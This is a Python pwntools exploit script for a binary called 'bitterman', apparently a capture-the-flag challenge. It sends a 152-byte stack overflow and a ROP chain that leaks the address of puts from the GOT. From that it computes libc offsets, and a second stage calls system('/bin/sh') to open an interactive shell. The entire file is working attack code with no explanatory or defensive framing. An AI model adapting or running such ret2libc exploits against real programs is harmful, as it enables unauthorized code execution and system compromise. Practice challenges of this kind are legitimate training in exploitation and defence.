from pwn import *

context(terminal=['tmux','new-window'])
p = process('./bitterman')
#p = gdb.debug('./bitterman','b main')

context(os="linux", arch="amd64")
#context.log_level = 'DEBUG'

#  400520:       ff 25 2a 07 20 00       jmpq   *0x20072a(%rip)        # 600c50 <puts@GLIBC_2.2.5>

plt_main = p64(0x4006ec)
plt_put = p64(0x400520)
got_put = p64(0x600c50)
pop_rdi = p64(0x400853)
junk = "A"*152

#> What's your name? 
#teste
#Hi, teste
#
#> Please input the length of your message: 
#1024
#> Please enter your text: 
#texto
#> Thanks!

payload = junk + pop_rdi + got_put + plt_put + plt_main

p.recvuntil("name?")
p.sendline("shell5")
p.recvuntil("message:")
p.sendline("1024")
p.recvuntil("text:")
p.sendline(payload)
p.recvuntil("Thanks!")
leaked_puts = p.recv()[:8].strip().ljust(8,"\x00")
log.success("Leaked puts@GLIBCL: " + str(leaked_puts))
leaked_puts = u64(leaked_puts)

# Stage 2
pop_rdi = p64(0x400853)
#   426: 0000000000071910   413 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
libc_put = 0x71910
#  1418: 00000000000449c0    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
libc_sys = 0x449c0
# 181519 /bin/sh
libc_sh = 0x181519

offset = leaked_puts - libc_put

sys = p64(offset + libc_sys)
sh = p64(offset + libc_sh)


payload = junk + pop_rdi + sh + sys

#p.recvuntil("name?")
p.sendline("shell8")

p.recvuntil("message:")
p.sendline("1024")

p.recvuntil("text:")
p.sendline(payload)
p.recvuntil("Thanks!")


p.interactive()
